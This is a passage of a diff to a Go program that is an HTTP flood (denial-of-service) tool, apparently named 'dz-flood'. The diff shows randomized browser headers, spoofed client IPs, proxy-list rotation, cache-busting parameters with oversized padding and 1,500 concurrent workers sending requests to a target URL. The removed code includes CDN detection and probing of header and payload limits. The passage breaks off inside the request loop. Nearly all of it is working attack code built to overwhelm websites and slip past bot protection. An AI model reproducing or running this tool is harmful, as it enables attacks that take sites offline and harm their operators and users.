@@ -6,15 +6,12 @@ import (
 	"crypto/tls"
 	"fmt"
 	"io"
-	"log"
 	"math/rand"
 	"net"
 	"net/http"
-	"net/http/cookiejar"
 	"net/url"
 	"os"
 	"os/signal"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -23,363 +20,222 @@ import (
 )
 
 const (
-	wrk        = 1500
-	to         = 5 * time.Second
-	sub        = 5
-	KEEP_ALIVE = 30 * time.Second
+	wrk = 1500
+	to  = 6 * time.Second
+	sub = 5
 )
 
-type BrowserProfile struct {
-	UA          string
-	Accept      string
-	Lang        string
-	Encoding    string
-	SecChUa     string
-	SecChUaMov  string
-	SecChUaPlat string
+var UA = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
 }
 
-var profiles = []BrowserProfile{
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-	},
-	{
-		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-	},
+var ACC = []string{
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
+	"application/json",
+	"*/*",
 }
 
-var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
-var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+var LAN = []string{
+	"ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU",
+	"en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA",
+	"en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA",
+	"en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8",
+	"en-GB,en;q=0.9", " en-GB,en;q=0.7", "*", "en-US,en;q=0.5",
+	"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
+	"utf-8, iso-8859-1;q=0.5, *;q=0.1",
+	"fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
+	"en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5",
+	"cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7",
+	"he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9",
+	"de-CH;q=0.7", "tr", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+}
+
+var ENC = []string{
+	"*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip",
+	"deflate, gzip", "gzip, identity", "gzip, deflate", "br",
+	"br;q=1.0, gzip;q=0.8, *;q=0.1",
+	"gzip;q=1.0, identity; q=0.5, *;q=0",
+	"gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25",
+	"compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress",
+	"compress, deflate", "compress", "gzip, deflate, br", "deflate",
+	"gzip, deflate, lzma, sdch", "deflate",
+}
+
+var CTRL = []string{
+	"max-age=604800", "proxy-revalidate", "public, max-age=0",
+	"max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800",
+	"s-maxage=604800", "max-stale", "public, immutable, max-age=31536000",
+	"must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+	"max-age=31536000,public,immutable", "max-age=31536000,public",
+	"min-fresh", "private", "public", "s-maxage", "no-cache",
+	"no-cache, no-transform", "max-age=2592000", "no-store", "no-transform",
+	"max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0",
+}
+
 var REF = []string{
 	"https://www.google.com/search?q=",
+	"https://check-host.net/",
+	"https://www.facebook.com/",
+	"https://www.youtube.com/",
 	"https://www.bing.com/search?q=",
-	"https://www.yahoo.com/search?p=",
-	"https://www.duckduckgo.com/?q=",
+	"https://r.search.yahoo.com/",
+	"https://www.cia.gov/index.html",
+	"https://vk.com/profile.php?redirect=",
+	"https://steamcommunity.com/market/search?q=",
+	"https://www.ted.com/search?q=",
+	"https://play.google.com/store/search?q=",
+	"https://www.qwant.com/search?q=",
 }
+
+var SITE = []string{"cross-site", "same-origin", "same-site", "none"}
+var MODE = []string{"cors", "navigate", "no-cors", "same-origin"}
+var DEST = []string{"document", "image", "embed", "empty", "frame"}
+
+var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t"}
+var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token"}
 
 type CLI struct {
 	client *http.Client
 	ip     string
 }
 
-type Capabilities struct {
-	Headers map[string]bool
-	Range   bool
-	IfRange bool
-}
-
-var cdnType string
-
 func init() {
-	runtime.GOMAXPROCS(runtime.NumCPU())
+	rand.Seed(time.Now().UnixNano())
 }
 
-func RIP(rng *rand.Rand) string {
-	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
-}
-
-func RST(rng *rand.Rand, length int) string {
-	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+func randstr(length int) string {
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 	b := make([]byte, length)
 	for i := range b {
-		b[i] = chars[rng.Intn(len(chars))]
+		b[i] = chars[rand.Intn(len(chars))]
 	}
 	return string(b)
 }
 
-var customCookie string
-var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
-
-func DetectCDN(target string) string {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	req, err := http.NewRequest("HEAD", target, nil)
-	if err != nil {
-		return "generic"
-	}
-	req.Header.Set("User-Agent", "Mozilla/5.0")
-	resp, err := client.Do(req)
-	if err != nil {
-		return "generic"
-	}
-	defer resp.Body.Close()
-
-	if resp.Header.Get("CF-Ray") != "" || resp.Header.Get("cf-request-id") != "" {
-		return "cloudflare"
-	}
-	if resp.Header.Get("X-Akamai-Transformed") != "" || strings.Contains(resp.Header.Get("Server"), "Akamai") {
-		return "akamai"
-	}
-	if resp.Header.Get("X-Amz-Cf-Id") != "" || strings.Contains(resp.Header.Get("Server"), "Amazon") {
-		return "aws"
-	}
-	if resp.Header.Get("X-Fastly-Request-ID") != "" {
-		return "fastly"
-	}
-	return "generic"
+func randomElement(arr []string) string {
+	return arr[rand.Intn(len(arr))]
 }
 
-func Detect_Pyload(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	sizes := []int{64, 128, 256, 512, 1024}
-	lastSuccess := 0
-	for _, size := range sizes {
-		testURL := target
-		if strings.Contains(testURL, "?") {
-			testURL += "&big=" + strings.Repeat("x", size)
-		} else {
-			testURL += "?big=" + strings.Repeat("x", size)
-		}
-		req, _ := http.NewRequest("GET", testURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		resp, err := client.Do(req)
-		if err != nil {
-			break
-		}
-		resp.Body.Close()
-		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			lastSuccess = size
-		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
-			break
-		} else {
-			break
-		}
-	}
-	return lastSuccess
+func ipSpoof() string {
+	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
 }
 
-func Detect_Header_Support(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	sizes := []int{512, 1024}
-	lastSuccess := 0
-	for _, size := range sizes {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
-		resp, err := client.Do(req)
-		if err != nil {
-			break
-		}
-		resp.Body.Close()
-		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-			lastSuccess = size
-		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
-			break
-		} else {
-			break
-		}
-	}
-	return lastSuccess
-}
+func HIN(ua string) (string, string, string) {
+	scu := `"Not?A_Brand";v="99"`
+	scm := "?0"
+	scp := "Windows"
 
-func Detect_Headers_Costum(target string, proxyIP string) Capabilities {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	parsedTarget, _ := url.Parse(target)
-	targetHost := parsedTarget.Hostname()
-	if proxyIP == "" {
-		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
-	}
-
-	headerList := []string{
-		"X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop",
-		"CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP",
-		"X-Originating-IP", "X-Forwarded-Proto", "X-Forwarded-Port",
-		"X-Forwarded-Scheme", "X-Requested-With", "Accept-Charset",
-		"Accept-Datetime", "From", "Max-Forwards", "Via", "Warning",
-		"DNT", "Upgrade", "Save-Data", "X-HTTP-Method-Override", "X-Cache",
-	}
-	result := make(map[string]bool)
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-
-	for _, h := range headerList {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		switch h {
-		case "X-Original-URL":
-			req.Header.Set("X-Original-URL", "/"+RST(rng, 8))
-		case "X-Forwarded-Host":
-			req.Header.Set("X-Forwarded-Host", targetHost)
-		case "X-Request-ID":
-			req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
-		case "CDN-Loop":
-			req.Header.Set("CDN-Loop", "cloudflare")
-		case "CF-Connecting-IP", "True-Client-IP", "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-			req.Header.Set(h, proxyIP)
-		case "X-Forwarded-Proto":
-			req.Header.Set(h, "https")
-		case "X-Forwarded-Port":
-			req.Header.Set(h, "443")
-		case "X-Forwarded-Scheme":
-			req.Header.Set(h, "https")
-		case "X-Requested-With":
-			req.Header.Set(h, "XMLHttpRequest")
-		case "Accept-Charset":
-			req.Header.Set(h, "utf-8")
-		case "Accept-Datetime":
-			req.Header.Set(h, time.Now().Format(time.RFC1123))
-		case "From":
-			req.Header.Set(h, "t.me/ytdizflzye.com")
-		case "Max-Forwards":
-			req.Header.Set(h, "5")
-		case "Via":
-			req.Header.Set(h, "1.1 proxy")
-		case "Warning":
-			req.Header.Set(h, "199 - \"misc\"")
-		case "DNT":
-			req.Header.Set(h, "1")
-		case "Upgrade":
-			req.Header.Set(h, "websocket")
-		case "Save-Data":
-			req.Header.Set(h, "on")
-		case "X-HTTP-Method-Override":
-			req.Header.Set(h, "PUT")
-		case "X-Cache":
-			req.Header.Set(h, "MISS")
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			result[h] = false
-			continue
-		}
-		resp.Body.Close()
-		code := resp.StatusCode
-		if code >= 200 && code < 400 {
-			result[h] = true
-		} else if code == 400 || code == 413 || code == 431 || code == 501 {
-			result[h] = false
-		} else {
-			result[h] = true
-		}
-	}
-
-	rangeSupported := false
-	req, _ := http.NewRequest("GET", target, nil)
-	req.Header.Set("Range", "bytes=0-0")
-	resp, err := client.Do(req)
-	if err == nil {
-		if resp.StatusCode == http.StatusPartialContent ||
-			(resp.StatusCode == http.StatusOK && resp.Header.Get("Content-Range") != "") {
-			rangeSupported = true
-		}
-		resp.Body.Close()
-	}
-
-	ifRangeSupported := false
-	if rangeSupported {
-		req, _ = http.NewRequest("GET", target, nil)
-		req.Header.Set("Range", "bytes=0-0")
-		req.Header.Set("If-Range", `"fake-etag-`+RST(rng, 8)+`"`)
-		resp, err = client.Do(req)
-		if err == nil {
-			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusPartialContent {
-				ifRangeSupported = true
+	if strings.Contains(ua, "Chrome/") {
+		idx := strings.Index(ua, "Chrome/")
+		if idx != -1 {
+			start := idx + len("Chrome/")
+			end := strings.Index(ua[start:], " ")
+			if end == -1 {
+				end = len(ua[start:])
 			}
-			resp.Body.Close()
+			version := ua[start : start+end]
+			parts := strings.Split(version, ".")
+			if len(parts) > 0 {
+				major := parts[0]
+				scu = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, major, major)
+			}
 		}
+	} else if strings.Contains(ua, "Edg/") {
+		idx := strings.Index(ua, "Edg/")
+		if idx != -1 {
+			start := idx + len("Edg/")
+			end := strings.Index(ua[start:], " ")
+			if end == -1 {
+				end = len(ua[start:])
+			}
+			version := ua[start : start+end]
+			parts := strings.Split(version, ".")
+			if len(parts) > 0 {
+				major := parts[0]
+				scu = fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not?A_Brand";v="99"`, major, major)
+			}
+		}
+	} else if strings.Contains(ua, "OPR/") {
+		idx := strings.Index(ua, "OPR/")
+		if idx != -1 {
+			start := idx + len("OPR/")
+			end := strings.Index(ua[start:], " ")
+			if end == -1 {
+				end = len(ua[start:])
+			}
+			version := ua[start : start+end]
+			parts := strings.Split(version, ".")
+			if len(parts) > 0 {
+				major := parts[0]
+				scu = fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not?A_Brand";v="99"`, major, major)
+			}
+		}
+	} else {
+		scu = ""
 	}
 
-	return Capabilities{
-		Headers: result,
-		Range:   rangeSupported,
-		IfRange: ifRangeSupported,
-	}
-}
-
-func Detect_Max_Total_Header_Size(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	sizes := []int{0, 512, 1024, 2048, 4096, 8192, 16384}
-	lastSuccess := 0
-	for _, size := range sizes {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("Accept", "*/*")
-		req.Header.Set("Connection", "close")
-		if size > 0 {
-			req.Header.Set("X-Filler", strings.Repeat("x", size))
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			break
-		}
-		resp.Body.Close()
-		code := resp.StatusCode
-		if code >= 200 && code < 400 {
-			lastSuccess = size
-		} else if code == 431 || code == 400 || code == 413 {
-			break
+	if strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
+		scm = "?1"
+		if strings.Contains(ua, "Android") {
+			scp = "Android"
 		} else {
-			lastSuccess = size
+			scp = "iOS"
 		}
+	} else if strings.Contains(ua, "Windows") {
+		scp = "Windows"
+	} else if strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X") {
+		scp = "macOS"
+	} else if strings.Contains(ua, "Linux") {
+		scp = "Linux"
 	}
-	return lastSuccess
+	return scu, scm, scp
 }
 
 func main() {
-	log.SetOutput(io.Discard)
-
-	if len(os.Args) < 2 {
-		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
-		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
+	if len(os.Args) < 6 {
+		fmt.Println("Usage: target time rate thread proxyfile")
 		os.Exit(1)
 	}
+
 	tgt := os.Args[1]
 	dur := 0
 	if len(os.Args) >= 3 {
@@ -387,17 +243,13 @@ func main() {
 			dur = d
 		}
 	}
-	if len(os.Args) >= 4 {
-		customCookie = os.Args[3]
-	}
 
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
 
-	cdnType = DetectCDN(tgt)
-
 	var proxies []*url.URL
-	file, err := os.Open("proxy.txt")
+	proxyFile := os.Args[5]
+	file, err := os.Open(proxyFile)
 	if err == nil {
 		defer file.Close()
 		scanner := bufio.NewScanner(file)
@@ -418,76 +270,42 @@ func main() {
 		proxies = append(proxies, nil)
 	}
 
-	var proxyIP string
-	if len(proxies) > 0 && proxies[0] != nil {
-		proxyIP = proxies[0].Hostname()
-	}
-
-	maxPayload := Detect_Pyload(tgt)
-	maxHeader := Detect_Header_Support(tgt)
-	caps := Detect_Headers_Costum(tgt, proxyIP)
-	_ = Detect_Max_Total_Header_Size(tgt)
-
 	wcs := make([]CLI, len(proxies))
-	for i, proxyURL := range proxies {
+	for i, PROXYLINK := range proxies {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
 				Timeout:   5 * time.Second,
-				KeepAlive: KEEP_ALIVE,
+				KeepAlive: 30 * time.Second,
 			}).DialContext,
 			DisableKeepAlives:      false,
-			MaxIdleConns:           50000,
-			MaxIdleConnsPerHost:    50000,
+			MaxIdleConns:           10000,
+			MaxIdleConnsPerHost:    5000,
 			MaxConnsPerHost:        0,
-			IdleConnTimeout:        KEEP_ALIVE,
+			IdleConnTimeout:        60 * time.Second,
 			TLSClientConfig: &tls.Config{
 				InsecureSkipVerify: true,
 				MinVersion:         tls.VersionTLS12,
 				MaxVersion:         tls.VersionTLS13,
-				NextProtos:         []string{"h2", "http/1.1"},
-				CipherSuites: []uint16{
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-				},
+				NextProtos:         []string{"h2"},
 			},
 			ForceAttemptHTTP2:     true,
-			DisableCompression:    false,
+			DisableCompression:    true,
 			TLSHandshakeTimeout:   4 * time.Second,
 			ResponseHeaderTimeout: 3 * time.Second,
-			ExpectContinueTimeout: 1 * time.Second,
+			ExpectContinueTimeout: 0,
 		}
 		ip := ""
-		if proxyURL != nil {
-			tr.Proxy = http.ProxyURL(proxyURL)
-			ip = proxyURL.Hostname()
+		if PROXYLINK != nil {
+			tr.Proxy = http.ProxyURL(PROXYLINK)
+			ip = PROXYLINK.Hostname()
 		}
-		jar, _ := cookiejar.New(nil)
 		client := &http.Client{
 			Transport: tr,
 			Timeout:   to,
-			Jar:       jar,
+			Jar:       nil,
 		}
 		wcs[i] = CLI{client: client, ip: ip}
 	}
-
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Author : Diz Flyze\n")
-	fmt.Printf("ޗ | Target : %s\n", tgt)
-	fmt.Printf("ޗ | Time   : %d/s\n", dur)
-	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d\n", wrk)
-	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
-	fmt.Printf("ޗ | Ulimit : 1048576\n")
-	if customCookie != "" {
-		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
-	} else {
-		fmt.Printf("ޗ | Cookie : False\n")
-	}
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
@@ -501,357 +319,84 @@ func main() {
 	for i := 0; i < wrk; i++ {
 		wg.Add(1)
 		c := wcs[i%len(wcs)]
-		go func(cli CLI, workerID int) {
+		go func(cli CLI) {
 			defer wg.Done()
-			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
-
 			var swg sync.WaitGroup
 			for s := 0; s < sub; s++ {
 				swg.Add(1)
-				go func(subID int) {
+				go func() {
 					defer swg.Done()
-					subRng := rand.New(rand.NewSource(rng.Int63()))
-
 					for ctx.Err() == nil {
-						prof := profiles[subRng.Intn(len(profiles))]
-
+						param := CBP[rand.Intn(len(CBP))]
 						reqURL := tgt
-
-						param := CBP[subRng.Intn(len(CBP))]
 						if strings.Contains(reqURL, "?") {
-							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
 						} else {
-							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
 						}
-
-						if maxPayload > 0 && subRng.Intn(3) == 0 {
-							size := maxPayload/2 + subRng.Intn(maxPayload/2)
-							if size < 1 {
-								size = 64
-							}
-							reqURL += "&big=" + strings.Repeat("x", size)
+						if rand.Intn(5) == 0 {
+							reqURL += "&big=" + strings.Repeat("x", 1024+rand.Intn(1024))
 						}
-
-						if subRng.Intn(2) == 0 {
-							reqURL += "&big2=" + strings.Repeat("x", 2048+subRng.Intn(4096))
-						}
-
-						if subRng.Intn(3) == 0 {
-							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 1024+subRng.Intn(2048))
-						}
-
-						if subRng.Intn(10) == 0 {
-							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
-						}
-
 						req, _ := http.NewRequest("GET", reqURL, nil)
 
-						headerMap := make(map[string]string)
+						ua := UA[rand.Intn(len(UA))]
+						ACCEPT := ACC[rand.Intn(len(ACC))]
+						lang := LAN[rand.Intn(len(LAN))]
+						enc := ENC[rand.Intn(len(ENC))]
+						ctrl := CTRL[rand.Intn(len(CTRL))]
 
